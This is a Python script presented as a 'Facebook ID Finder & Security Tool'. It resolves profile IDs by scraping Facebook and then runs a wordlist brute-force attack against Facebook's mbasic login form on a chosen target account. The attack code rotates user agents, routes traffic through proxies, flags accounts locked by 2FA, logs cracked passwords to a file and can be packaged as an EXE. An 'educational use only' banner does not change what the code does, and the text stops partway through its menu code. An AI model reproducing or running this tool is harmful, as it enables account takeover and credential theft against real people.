#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
███████╗ █████╗  ██████╗███████╗██████╗  ██████╗  ██████╗ ██╗  ██╗
██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██║ ██╔╝
█████╗  ███████║██║     █████╗  ██████╔╝██║   ██║██║   ██║█████╔╝ 
██╔══╝  ██╔══██║██║     ██╔══╝  ██╔══██╗██║   ██║██║   ██║██╔═██╗ 
██║     ██║  ██║╚██████╗███████╗██████╔╝╚██████╔╝╚██████╔╝██║  ██╗
╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
"""

import os
import sys
import re
import time
import json
import random
import socket
import threading
import subprocess
import importlib
from datetime import datetime
from urllib.parse import urlparse, quote, unquote, parse_qs
from html.parser import HTMLParser
import warnings
warnings.filterwarnings('ignore')

# ============================================
# COLOR SYSTEM
# ============================================
class C:
    R = '\033[0m'       # Reset
    B = '\033[1m'       # Bold
    D = '\033[2m'       # Dim
    
    K = '\033[30m'      # Black
    R_ = '\033[31m'     # Red
    G = '\033[32m'      # Green
    Y = '\033[33m'      # Yellow
    BL = '\033[34m'     # Blue
    M = '\033[35m'      # Magenta
    C_ = '\033[36m'     # Cyan
    W = '\033[37m'      # White
    
    BK = '\033[90m'     # Bright Black
    BR = '\033[91m'     # Bright Red
    BG = '\033[92m'     # Bright Green
    BY = '\033[93m'     # Bright Yellow
    BBL = '\033[94m'    # Bright Blue
    BM = '\033[95m'     # Bright Magenta
    BC = '\033[96m'     # Bright Cyan
    BW = '\033[97m'     # Bright White

# ============================================
# AUTO INSTALL
# ============================================

def auto_install():
    """Auto install all modules"""
    modules = {
        'requests': 'requests',
        'mechanize': 'mechanize',
        'bs4': 'beautifulsoup4',
    }
    
    missing = []
    
    print(f"\n{C.BC}╔══════════════════════════════════════════╗{C.R}")
    print(f"{C.BC}║{C.R}  {C.B}🔧 CHECKING MODULES...{C.R}" + " "*20 + f"{C.BC}║{C.R}")
    print(f"{C.BC}╚══════════════════════════════════════════╝{C.R}\n")
    
    for mod, pip_name in modules.items():
        try:
            if mod == 'bs4':
                importlib.import_module('bs4')
            else:
                importlib.import_module(mod)
            print(f"  {C.BG}✅{C.R} {mod} - OK")
        except ImportError:
            print(f"  {C.BY}⚠️ {C.R} {mod} - MISSING")
            missing.append(pip_name)
    
    if missing:
        print(f"\n{C.BY}📦 Installing...{C.R}\n")
        for m in missing:
            try:
                print(f"  {C.BC}📥 {m}...{C.R}", end=' ')
                subprocess.check_call(
                    [sys.executable, "-m", "pip", "install", m],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                print(f"{C.BG}✅{C.R}")
            except:
                try:
                    subprocess.check_call(
                        ["pip", "install", m],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL
                    )
                    print(f"{C.BG}✅{C.R}")
                except:
                    print(f"{C.BR}❌{C.R}")
                    print(f"\n{C.BR}Manual: pip install {m}{C.R}")
                    return False
        print(f"\n{C.BG}✅ All modules ready!{C.R}\n")
        time.sleep(1)
    else:
        print(f"\n{C.BG}✅ All modules OK!{C.R}\n")
    
    return True

# ============================================
# LOADING SPINNER
# ============================================

class Spin:
    def __init__(self, msg="Loading"):
        self.msg = msg
        self.run = False
        self.frames = ['⠋','⠙','⠹','⠸','⠼','⠴','⠦','⠧','⠇','⠏']
    
    def start(self):
        self.run = True
        def anim():
            i = 0
            while self.run:
                sys.stdout.write(f'\r{C.BC}{self.frames[i]}{C.R} {self.msg}...')
                sys.stdout.flush()
                time.sleep(0.1)
                i = (i+1) % len(self.frames)
            sys.stdout.write('\r' + ' '* (len(self.msg)+20) + '\r')
            sys.stdout.flush()
        self.t = threading.Thread(target=anim, daemon=True)
        self.t.start()
    
    def stop(self):
        self.run = False
        if hasattr(self, 't'):
            self.t.join(timeout=1)

# ============================================
# SCREEN & BANNER
# ============================================

def cls():
    os.system('cls' if sys.platform == 'win32' else 'clear')

def banner():
    cls()
    print(f"""
{C.BC}╔══════════════════════════════════════════════════════════════╗
{C.BC}║                                                              ║
{C.BR}║   ███████╗ █████╗  ██████╗███████╗██████╗  ██████╗  ██████╗ {C.BC}║
{C.BY}║   ██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗██╔═══██╗██╔═══██╗{C.BC}║
{C.BG}║   █████╗  ███████║██║     █████╗  ██████╔╝██║   ██║██║   ██║{C.BC}║
{C.BBL}║   ██╔══╝  ██╔══██║██║     ██╔══╝  ██╔══██╗██║   ██║██║   ██║{C.BC}║
{C.BM}║   ██║     ██║  ██║╚██████╗███████╗██████╔╝╚██████╔╝╚██████╔╝{C.BC}║
{C.BC}║   ╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═════╝  ╚═════╝  ╚═════╝ {C.BC}║
{C.BC}║                                                              ║
{C.BC}╠══════════════════════════════════════════════════════════════╣
{C.BC}║                                                              ║
{C.BW}║  {C.BR}🔐 {C.B}FACEBOOK ID FINDER & SECURITY TOOL{C.R}                    {C.BC}║
{C.BW}║  {C.BY}⚠️  EDUCATIONAL & AUTHORIZED USE ONLY{C.R}                     {C.BC}║
{C.BC}║                                                              ║
{C.BC}╠══════════════════════════════════════════════════════════════╣
{C.BC}║                                                              ║
{C.BW}║  {C.BG}👨‍💻 DEV: {C.BY}CHOWDHURY VAI{C.R}                                      {C.BC}║
{C.BW}║  {C.BG}🐙 GITHUB: {C.BBL}https://github.com/chowdhuryvai{C.R}              {C.BC}║
{C.BW}║  {C.BG}📅 VERSION: {C.BM}v6.0 FINAL{C.R}                                     {C.BC}║
{C.BC}║                                                              ║
{C.BC}╚══════════════════════════════════════════════════════════════╝{C.R}
""")

# ============================================
# FACEBOOK HTML PARSER
# ============================================

class FBParser(HTMLParser):
    """Parse Facebook HTML to find IDs"""
    
    def __init__(self):
        super().__init__()
        self.ids = set()
        self.links = []
    
    def handle_starttag(self, tag, attrs):
        d = dict(attrs)
        
        # Meta tags
        if tag == 'meta':
            content = d.get('content', '')
            if 'fb://profile/' in content or 'fb://page/' in content:
                m = re.search(r'fb://(?:profile|page)/(\d+)', content)
                if m:
                    self.ids.add(m.group(1))
        
        # Links
        if tag == 'a':
            href = d.get('href', '')
            if 'facebook.com' in href or 'fb.com' in href:
                self.links.append(href)
    
    def handle_data(self, data):
        # Look for IDs in data
        for m in re.finditer(r'\b(\d{5,20})\b', data):
            self.ids.add(m.group(1))
    
    def get_ids(self):
        return list(self.ids)

# ============================================
# ULTIMATE FACEBOOK ID FINDER
# ============================================

class FB_ID_Finder:
    """Find Facebook Profile ID from ANY URL"""
    
    def __init__(self):
        self.agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPad; CPU OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
            'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.64 Mobile Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15',
        ]
    
    def _session(self):
        """Create session"""
        import requests
        from requests.adapters import HTTPAdapter
        from urllib3.util.retry import Retry
        
        s = requests.Session()
        retry = Retry(total=3, backoff_factor=1, status_forcelist=[429,500,502,503,504])
        adapter = HTTPAdapter(max_retries=retry)
        s.mount('https://', adapter)
        s.mount('http://', adapter)
        return s
    
    def _headers(self):
        return {
            'User-Agent': random.choice(self.agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9,bn;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Cache-Control': 'max-age=0',
        }
    
    def _clean_url(self, url):
        """Clean and normalize URL"""
        url = url.strip()
        url = url.replace('@', '')
        
        if not url.startswith('http'):
            url = 'https://' + url
        
        # Remove tracking
        if '?' in url:
            url = url.split('?')[0]
        
        # Parse
        p = urlparse(url)
        host = p.netloc.lower()
        path = p.path.rstrip('/')
        
        # Fix host
        if 'facebook.com' in host or 'fb.com' in host or 'fb.me' in host:
            # Use www.facebook.com as standard
            host = 'www.facebook.com'
        else:
            host = 'www.facebook.com'
        
        return f'https://{host}{path}'
    
    def _extract_username(self, url):
        """Extract username from URL"""
        p = urlparse(url)
        path = p.path.strip('/')
        
        if not path:
            return None
        
        # Remove known paths
        if path.startswith('profile.php'):
            # Contains ID in query
            qs = parse_qs(p.query)
            if 'id' in qs:
                return qs['id'][0]
            return None
        
        if path.startswith('groups/'):
            parts = path.split('/')
            return parts[-1] if len(parts) > 1 else None
        
        # Regular username
        parts = path.split('/')
        username = parts[-1] if parts[-1] else (parts[-2] if len(parts) > 1 else None)
        
        # Remove common words
        skip = ['photo', 'photos', 'videos', 'about', 'friends', 'posts', 'events']
        if username and username.lower() in skip:
            return None
        
        return username
    
    def find_id(self, profile_url):
        """MAIN METHOD: Find Facebook ID"""
        import requests
        
        print(f"\n{C.BC}╔══════════════════════════════════════════╗{C.R}")
        print(f"{C.BC}║{C.R}  {C.B}🔍 FACEBOOK PROFILE ID FINDER{C.R}" + " "*13 + f"{C.BC}║{C.R}")
        print(f"{C.BC}╚══════════════════════════════════════════╝{C.R}\n")
        
        # Clean URL
        url = self._clean_url(profile_url)
        print(f"  {C.W}Input:{C.R}  {C.C_}{profile_url}{C.R}")
        print(f"  {C.W}Clean:{C.R}  {C.BK}{url}{C.R}\n")
        
        # Extract username
        username = self._extract_username(url)
        
        # If username is numeric, it's already an ID
        if username and username.isdigit():
            print(f"  {C.BG}✅ URL already contains numeric ID!{C.R}")
            print(f"\n  {C.BY}{'═'*50}{C.R}")
            print(f"  {C.BW}Profile ID:{C.R} {C.BG}{C.B}{username}{C.R}")
            print(f"  {C.BY}{'═'*50}{C.R}\n")
            return username
        
        if username:
            print(f"  {C.W}Username:{C.R} {C.BY}{username}{C.R}\n")
        
        # Try multiple methods
        all_ids = set()
        session = self._session()
        
        # ==========================================
        # METHOD 1: mbasic.facebook.com
        # ==========================================
        print(f"  {C.BC}[METHOD 1]{C.R} mbasic.facebook.com")
        try:
            spin = Spin("Fetching mbasic page")
            spin.start()
            
            mbasic_url = f'https://mbasic.facebook.com/{username}' if username else url
            r = session.get(mbasic_url, headers=self._headers(), timeout=15, verify=False, allow_redirects=True)
            
            spin.stop()
            
            if r.status_code == 200:
                html = r.text
                final_url = r.url
                
                # Parse HTML
                parser = FBParser()
                parser.feed(html)
                ids = parser.get_ids()
                
                # Regex patterns
                patterns = [
                    r'"userID"\s*:\s*"(\d+)"',
                    r'"userID"\s*:\s*(\d+)',
                    r'"userid"\s*:\s*"(\d+)"',
                    r'"profile_id"\s*:\s*"(\d+)"',
                    r'"profile_id"\s*:\s*(\d+)',
                    r'"profileID"\s*:\s*"(\d+)"',
                    r'"owner"\s*:\s*\{[^}]*"id"\s*:\s*"(\d+)"',
                    r'"entity_id"\s*:\s*"(\d+)"',
                    r'"entity_id"\s*:\s*(\d+)',
                    r'"actor_id"\s*:\s*"(\d+)"',
                    r'"actorID"\s*:\s*"(\d+)"',
                    r'"pageID"\s*:\s*"(\d+)"',
                    r'"page_id"\s*:\s*"(\d+)"',
                    r'"targetID"\s*:\s*"(\d+)"',
                    r'"fb://profile/(\d+)"',
                    r'content="fb://profile/(\d+)"',
                    r'profile\.php\?id=(\d+)',
                    r'"canonical_url"\s*:\s*"[^"]*?(\d{5,})',
                    r'data-profileid="(\d+)"',
                    r'data-userid="(\d+)"',
                    r'data-ownerid="(\d+)"',
                ]
                
                for pattern in patterns:
                    for m in re.finditer(pattern, html, re.IGNORECASE):
                        if m.group(1).isdigit() and 5 <= len(m.group(1)) <= 20:
                            all_ids.add(m.group(1))
                
                # Check final URL for ID
                for url_pat in [r'profile\.php\?id=(\d+)', r'/(\d{5,})$', r'/(\d{5,})\?']:
                    for m in re.finditer(url_pat, final_url):
                        if m.group(1).isdigit():
                            all_ids.add(m.group(1))
                
                if all_ids:
                    print(f"  {C.BG}✅ Found {len(all_ids)} ID(s){C.R}")
                else:
                    print(f"  {C.BY}⚠️  No ID found{C.R}")
            else:
                spin.stop()
                print(f"  {C.BR}❌ HTTP {r.status_code}{C.R}")
        except Exception as e:
            spin.stop()
            print(f"  {C.BR}❌ Error: {str(e)[:50]}{C.R}")
        
        # ==========================================
        # METHOD 2: Graph API
        # ==========================================
        if username and not all_ids:
            print(f"\n  {C.BC}[METHOD 2]{C.R} Facebook Graph API")
            try:
                spin = Spin("Querying Graph API")
                spin.start()
                
                api_urls = [
                    f'https://graph.facebook.com/{username}?fields=id,name',
                    f'https://graph.facebook.com/v18.0/{username}?fields=id,name',
                    f'https://graph.facebook.com/v17.0/{username}?fields=id,name',
                ]
                
                for api_url in api_urls:
                    try:
                        r = session.get(api_url, headers=self._headers(), timeout=10, verify=False)
                        if r.status_code == 200:
                            data = r.json()
                            if 'id' in data:
                                all_ids.add(data['id'])
                                break
                    except:
                        continue
                
                spin.stop()
                
                if all_ids:
                    print(f"  {C.BG}✅ Graph API success{C.R}")
                else:
                    print(f"  {C.BY}⚠️  Graph API failed{C.R}")
            except:
                spin.stop()
                print(f"  {C.BR}❌ Failed{C.R}")
        
        # ==========================================
        # METHOD 3: Redirect method
        # ==========================================
        if username and not all_ids:
            print(f"\n  {C.BC}[METHOD 3]{C.R} Redirect Resolution")
            try:
                spin = Spin("Checking redirect")
                spin.start()
                
                redirect_urls = [
                    f'https://facebook.com/{username}',
                    f'https://www.facebook.com/{username}',
                ]
                
                for red_url in redirect_urls:
                    try:
                        r = session.get(red_url, headers=self._headers(), timeout=10, 
                                      allow_redirects=False, verify=False)
                        location = r.headers.get('Location', '')
                        if location:
                            m = re.search(r'(\d{5,})', location)
                            if m:
                                all_ids.add(m.group(1))
                    except:
                        continue
                
                spin.stop()
                
                if all_ids:
                    print(f"  {C.BG}✅ Redirect found ID{C.R}")
                else:
                    print(f"  {C.BY}⚠️  No redirect ID{C.R}")
            except:
                spin.stop()
                print(f"  {C.BR}❌ Failed{C.R}")
        
        # ==========================================
        # METHOD 4: Online services
        # ==========================================
        if not all_ids:
            print(f"\n  {C.BC}[METHOD 4]{C.R} Online Services")
            try:
                spin = Spin("Trying findmyfbid.in")
                spin.start()
                
                api = f'https://findmyfbid.in/api/fbid?url={quote(profile_url)}'
                r = session.get(api, headers=self._headers(), timeout=15, verify=False)
                
                if r.status_code == 200:
                    data = r.json()
                    if 'id' in data and data['id']:
                        all_ids.add(data['id'])
                
                spin.stop()
                
                if all_ids:
                    print(f"  {C.BG}✅ Online service success{C.R}")
                else:
                    print(f"  {C.BY}⚠️  Online service failed{C.R}")
            except:
                spin.stop()
                print(f"  {C.BR}❌ Failed{C.R}")
        
        # ==========================================
        # METHOD 5: www.facebook.com
        # ==========================================
        if not all_ids and username:
            print(f"\n  {C.BC}[METHOD 5]{C.R} www.facebook.com")
            try:
                spin = Spin("Fetching full page")
                spin.start()
                
                www_url = f'https://www.facebook.com/{username}'
                r = session.get(www_url, headers=self._headers(), timeout=15, verify=False)
                
                spin.stop()
                
                if r.status_code == 200:
                    html = r.text
                    
                    # Aggressive pattern matching
                    all_patterns = [
                        r'"userID"\s*:\s*"(\d+)"',
                        r'"userID"\s*:\s*(\d+)',
                        r'"userid"\s*:\s*"(\d+)"',
                        r'"profile_id"\s*:\s*"(\d+)"',
                        r'"profile_id"\s*:\s*(\d+)',
                        r'"profileID"\s*:\s*"(\d+)"',
                        r'"profileID"\s*:\s*(\d+)',
                        r'"id"\s*:\s*"(\d{5,})"',
                        r'"entity_id"\s*:\s*"(\d+)"',
                        r'"entity_id"\s*:\s*(\d+)',
                        r'"owner"\s*:\s*\{[^}]*?"id"\s*:\s*"(\d+)"',
                        r'"pageID"\s*:\s*"(\d+)"',
                        r'"page_id"\s*:\s*"(\d+)"',
                        r'"actorID"\s*:\s*"(\d+)"',
                        r'"actor_id"\s*:\s*"(\d+)"',
                        r'"account_id"\s*:\s*"(\d+)"',
                        r'"targetID"\s*:\s*"(\d+)"',
                        r'"subjectID"\s*:\s*"(\d+)"',
                        r'fb://profile/(\d+)',
                        r'content="fb://profile/(\d+)"',
                        r'data-profileid="(\d+)"',
                        r'data-userid="(\d+)"',
                        r'data-ownerid="(\d+)"',
                        r'profile\.php\?id=(\d+)',
                    ]
                    
                    for pattern in all_patterns:
                        for m in re.finditer(pattern, html, re.IGNORECASE):
                            val = m.group(1)
                            if val.isdigit() and 5 <= len(val) <= 20:
                                # Skip common false positives
                                skip = ['12345','123456','1234567','11111','22222','33333','44444','55555']
                                if val not in skip:
                                    all_ids.add(val)
                    
                    if all_ids:
                        print(f"  {C.BG}✅ Found {len(all_ids)} ID(s){C.R}")
                    else:
                        print(f"  {C.BY}⚠️  No ID found{C.R}")
                else:
                    spin.stop()
                    print(f"  {C.BR}❌ HTTP {r.status_code}{C.R}")
            except Exception as e:
                spin.stop()
                print(f"  {C.BR}❌ Error: {str(e)[:50]}{C.R}")
        
        # ==========================================
        # RESULT
        # ==========================================
        print(f"\n  {C.BC}{'═'*50}{C.R}")
        
        if all_ids:
            # Sort by length (longer is usually more accurate)
            id_list = sorted(list(all_ids), key=lambda x: (len(x), int(x)), reverse=True)
            best_id = id_list[0]
            
            print(f"\n  {C.BG}{'═'*50}{C.R}")
            print(f"  {C.BG}║{C.R}  {C.BW}{C.B}🎯 FACEBOOK PROFILE ID FOUND!{C.R}" + " "*12 + f"{C.BG}║{C.R}")
            print(f"  {C.BG}║{C.R}  {C.BY}{'─'*40}{C.R}" + " "*6 + f"{C.BG}║{C.R}")
            print(f"  {C.BG}║{C.R}  {C.W}Profile URL:{C.R} {C.C_}{profile_url}{C.R}" + " "*6 + f"{C.BG}║{C.R}")
            print(f"  {C.BG}║{C.R}  {C.W}Profile ID:{C.R}  {C.BG}{C.B}{best_id}{C.R}" + " "*6 + f"{C.BG}║{C.R}")
            print(f"  {C.BG}║{C.R}  {C.BY}{'─'*40}{C.R}" + " "*6 + f"{C.BG}║{C.R}")
            print(f"  {C.BG}║{C.R}  {C.W}Use command:{C.R}" + " "*28 + f"{C.BG}║{C.R}")
            print(f"  {C.BG}║{C.R}  {C.G}python fb.py -t {best_id} -w wordlist.txt{C.R}" + " "*6 + f"{C.BG}║{C.R}")
            print(f"  {C.BG}{'═'*50}{C.R}")
            
            # Save
            try:
                with open('found_ids.txt', 'a') as f:
                    f.write(f"\n{'='*40}\nTime: {datetime.now()}\nURL: {profile_url}\nID: {best_id}\n{'='*40}\n")
            except:
                pass
            
            return best_id
        else:
            print(f"\n  {C.BR}{'═'*50}{C.R}")
            print(f"  {C.BR}║{C.R}  {C.BW}❌ COULD NOT EXTRACT ID{C.R}" + " "*19 + f"{C.BR}║{C.R}")
            print(f"  {C.BR}{'═'*50}{C.R}")
            print(f"\n  {C.BY}💡 TRY THESE:{C.R}")
            print(f"  {C.W}1. Open: {C.BBL}https://findmyfbid.in/{C.R}")
            print(f"  {C.W}2. Open: {C.BBL}https://lookup-id.com/{C.R}")
            print(f"  {C.W}3. Use email/phone directly:{C.R}")
            print(f"     {C.G}python fb.py -t email@x.com -w wl.txt{C.R}")
            print(f"  {C.W}4. View page source (Ctrl+U) → Ctrl+F → '{C.G}userID{C.W}'{C.R}\n")
            return None

# ============================================
# FACEBOOK PASSWORD TESTER
# ============================================

class FB_Tester:
    """Facebook Password Testing"""
    
    def __init__(self):
        self.proxy = None
        self.count = 0
        
        import mechanize
        self.br = mechanize.Browser()
        self.br.set_handle_robots(False)
        self.br.set_handle_equiv(True)
        self.br.set_handle_redirect(True)
        self.br.set_handle_referer(True)
        self.br._factory.is_html = True
        
        self.agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        ]
        self.br.addheaders = [('User-agent', random.choice(self.agents))]
    
    @staticmethod
    def net_ok():
        try:
            socket.create_connection(("8.8.8.8", 53), timeout=3)
            return True
        except:
            return False
    
    @staticmethod
    def proxy_ok(proxy):
        try:
            import requests
            p = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
            r = requests.get('https://api.ipify.org?format=json', proxies=p, timeout=10, verify=False)
            return r.status_code == 200
        except:
            return False
    
    def test(self, target, password):
        try:
            self.count += 1
            time.sleep(random.uniform(0.5, 1.5))
            
            self.br.open("https://mbasic.facebook.com/login.php", timeout=15)
            self.br.select_form(nr=0)
            self.br.form['email'] = target
            self.br.form['pass'] = password
            
            resp = self.br.submit()
            data = resp.read().decode('utf-8', errors='ignore')
            
            if 'home_icon' in data or 'logout' in data.lower():
                return 1
            elif 'checkpoint' in self.br.geturl():
                return 2
            return 0
        except:
            self.br.addheaders = [('User-agent', random.choice(self.agents))]
            time.sleep(2)
            return -1
    
    def attack(self, target, wordlist=None, single=None):
        print(f"\n{C.BC}╔══════════════════════════════════════════╗{C.R}")
        print(f"{C.BC}║{C.R}  {C.B}🚀 ATTACK STARTED{C.R}" + " "*25 + f"{C.BC}║{C.R}")
        print(f"{C.BC}╚══════════════════════════════════════════╝{C.R}\n")
        
        print(f"  {C.W}Target:{C.R} {C.BG}{target}{C.R}")
        
        if single:
            print(f"  {C.W}Password:{C.R} {C.BY}{single}{C.R}")
            passwords = [single]
        else:
            if not os.path.exists(wordlist):
                print(f"  {C.BR}❌ Wordlist not found!{C.R}")
                return
            with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [l.strip() for l in f if l.strip()]
            print(f"  {C.W}Wordlist:{C.R} {C.BY}{os.path.basename(wordlist)}{C.R}")
            print(f"  {C.W}Passwords:{C.R} {C.BM}{len(passwords):,}{C.R}")
        
        if self.proxy:
            print(f"  {C.W}Proxy:{C.R} {C.BG}{self.proxy}{C.R}")
        
        if not single:
            print(f"\n{C.BY}⚠️  Testing {len(passwords):,} passwords{C.R}")
            c = input(f"{C.Y}Continue? (y/N): {C.R}").strip().lower()
            if c != 'y':
                print(f"{C.BL}ℹ️  Cancelled{C.R}")
                return
        
        print(f"\n{C.BC}{'─'*50}{C.R}\n")
        
        st = time.time()
        
        for i, pwd in enumerate(passwords, 1):
            pwd = pwd.strip()
            if len(pwd) < 6:
                continue
            
            elapsed = time.time() - st
            speed = i / elapsed if elapsed > 0 else 0
            eta = (len(passwords) - i) / speed if speed > 0 else 0
            
            sys.stdout.write(f'\r  {C.C_}[{C.Y}{i}/{len(passwords)}{C.C_}]{C.R} '
                           f'{C.W}Test:{C.R} {C.BK}{pwd[:25]:<25}{C.R} '
                           f'{C.M}{speed:.0f}/s{C.R} '
                           f'ETA:{C.BL}{int(eta//60)}m{int(eta%60)}s{C.R}')
            sys.stdout.flush()
            
            result = self.test(target, pwd)
            
            if result == 1:
                print(f"\n\n{C.BG}{'═'*50}{C.R}")
                print(f"{C.BG}║{C.R}  {C.BY}{C.B}🎉 PASSWORD FOUND!{C.R}" + " "*25 + f"{C.BG}║{C.R}")
                print(f"{C.BG}║{C.R}  {C.W}Target:{C.R}   {C.BG}{target}{C.R}" + " "*25 + f"{C.BG}║{C.R}")
                print(f"{C.BG}║{C.R}  {C.W}Password:{C.R} {C.BR}{C.B}{pwd}{C.R}" + " "*25 + f"{C.BG}║{C.R}")
                print(f"{C.BG}║{C.R}  {C.W}Time:{C.R}     {C.C_}{time.time()-st:.1f}s{C.R}" + " "*25 + f"{C.BG}║{C.R}")
                print(f"{C.BG}{'═'*50}{C.R}\n")
                self._save(target, pwd)
                return True
            elif result == 2:
                print(f"\n\n{C.BY}{'═'*50}{C.R}")
                print(f"  {C.B}⚠️  FOUND BUT 2FA LOCKED{C.R}")
                print(f"  {C.W}Password:{C.R} {C.BR}{pwd}{C.R}")
                print(f"{C.BY}{'═'*50}{C.R}\n")
                self._save(target, pwd, "2FA")
                return True
        
        print(f"\n\n{C.BR}{'═'*50}{C.R}")
        print(f"  ❌ NOT FOUND | {time.time()-st:.1f}s | {i:,} tested{C.R}")
        print(f"{C.BR}{'═'*50}{C.R}\n")
        return False
    
    def _save(self, target, pwd, status="OK"):
        try:
            with open('results.txt', 'a') as f:
                f.write(f"\n[{datetime.now()}] {target}:{pwd} ({status})\n")
        except:
            pass

# ============================================
# BUILD EXE
# ============================================

def build_exe():
    print(f"\n{C.BC}╔══════════════════════════════════════════╗{C.R}")
    print(f"{C.BC}║{C.R}  {C.B}🔨 BUILD EXECUTABLE{C.R}" + " "*25 + f"{C.BC}║{C.R}")
    print(f"{C.BC}╚══════════════════════════════════════════╝{C.R}\n")
    
    try:
        import PyInstaller
    except:
        print(f"  {C.Y}📦 Installing PyInstaller...{C.R}")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    script = sys.argv[0] if sys.argv[0].endswith('.py') else 'fb.py'
    
    cmd = [sys.executable, '-m', 'PyInstaller', '--onefile', '--console',
           '--name', 'FB_ID_Finder', '--clean', '--noconfirm', script]
    
    print(f"  {C.C_}Building...{C.R}")
    subprocess.run(cmd)
    print(f"\n  {C.BG}✅ EXE: dist/FB_ID_Finder.exe{C.R}\n")

# ============================================
# MAIN
# ============================================

def main():
    if not auto_install():
        input(f"\n{C.BR}Press Enter...{C.R}")
        sys.exit(1)
    
    import argparse
    p = argparse.ArgumentParser(description=f'{C.BC}Facebook ID Finder & Tester{C.R}')
    p.add_argument('-t', '--target', help='Target email/phone/ID')
    p.add_argument('-w', '--wordlist', help='Wordlist path')
    p.add_argument('-s', '--single', help='Single password')
    p.add_argument('-p', '--proxy', help='Proxy IP:PORT')
    p.add_argument('-g', '--getid', help='Facebook profile URL to get ID')
    p.add_argument('--build', action='store_true', help='Build EXE')
    
    args = p.parse_args()
    
    if args.build:
        build_exe()
        return
    
    if not any([args.target, args.getid]):
        menu()
        return
    
    finder = FB_ID_Finder()
    tester = FB_Tester()
    
    if args.proxy:
        if tester.proxy_ok(args.proxy):
            tester.proxy = args.proxy
            tester.br.set_proxies({'http': f'http://{args.proxy}', 'https': f'http://{args.proxy}'})
        else:
            print(f"{C.BR}❌ Proxy failed!{C.R}")
    
    if args.getid:
        finder.find_id(args.getid)
        return
    
    if args.target:
        if not tester.net_ok():
            print(f"{C.BR}❌ No internet!{C.R}")
            return
        if args.single:
            tester.attack(args.target, single=args.single)
        elif args.wordlist:
            tester.attack(args.target, wordlist=args.wordlist)
        else:
            print(f"{C.BR}❌ Use -w or -s{C.R}")

def menu():
    finder = FB_ID_Finder()
    tester = FB_Tester()
    
    while True:
        banner()
        
        items = [
            ("1", "🔍", "Find Profile ID", "Get numeric ID from ANY Facebook URL"),
            ("2", "🔑", "Single Password", "Test one password"),
            ("3", "📚", "Wordlist Attack", "Dictionary attack"),
            ("4", "🌐", "Proxy Setup", "Configure proxy"),
            ("5", "🔨", "Build EXE", "Create .exe file"),
            ("6", "🚪", "Exit", "Close program"),
        ]
        
        for n, i, t, d in items:
            print(f"  {C.BC}[{C.BW}{n}{C.BC}]{C.R} {i} {C.BY}{C.B}{t}{C.R}")
            print(f"      {C.BK}{d}{C.R}")
        
        print(f"\n{C.BC}{'─'*50}{C.R}")
        ch = input(f"\n{C.BG}┌─[{C.BY}CHOICE{C.BG}]──[{C.BW}1-6{C.BG}]\n{C.BG}└──> {C.R}").strip()
        
        if ch == '1':
            banner()
            print(f"\n{C.BC}╔══════════════════════════════════════════╗{C.R}")
            print(f"{C.BC}║{C.R}  {C.B}🔍 FIND FACEBOOK PROFILE ID{C.R}" + " "*13 + f"{C.BC}║{C.R}")
            print(f"{C.BC}╚══════════════════════════════════════════╝{C.R}\n")
            print(f"  {C.W}Examples:{C.R}")
            print(f"  {C.BK}• https://facebook.com/username{C.R}")
            print(f"  {C.BK}• https://www.facebook.com/profile.php?id=123{C.R}")
            print(f"  {C.BK}• https://fb.com/username{C.R}")
            print(f"  {C.BK}• https://m.facebook.com/username{C.R}")
            print(f"  {C.BK}• Any Facebook profile/group/page link{C.R}\n")
            
            url = input(f"  {C.BY}📎 Enter URL: {C.R}").strip()
            if url:
                if not tester.net_ok():
                    print(f"\n{C.BR}❌ No internet!{C.R}")
                else:
                    finder.find_id(url)
            input(f"\n{C.BK}Press Enter...{C.R}")
        
        elif ch == '2':
            banner()
            target = input(f"\n{C.Y}Target (email/phone/ID): {C.R}").strip()
            pwd = input(f"{C.Y}Password: {C.R}").strip()
            if target and pwd and len(pwd) >= 6:
                if tester.net_ok():
                    tester.attack(target, single=pwd)
            input(f"\n{C.BK}Press Enter...{C.R}")
